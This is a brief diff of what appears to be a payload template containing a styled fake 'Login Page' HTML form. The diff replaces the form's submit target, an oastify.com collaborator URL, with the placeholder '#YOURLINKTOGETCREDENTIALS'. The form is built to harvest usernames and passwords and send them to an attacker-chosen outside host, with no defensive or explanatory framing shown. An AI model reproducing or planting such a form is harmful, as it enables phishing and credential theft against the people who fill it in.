@@ -6,7 +6,7 @@ info:
    <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
 <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-    <form action="https://wppyzwnk3ihxuvrjhk6l6snpzg57txhm.oastify.com" method="post" class="form-signin">
+    <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
         <div class="form-group" style="margin-bottom: 15px;">
             <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
             <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
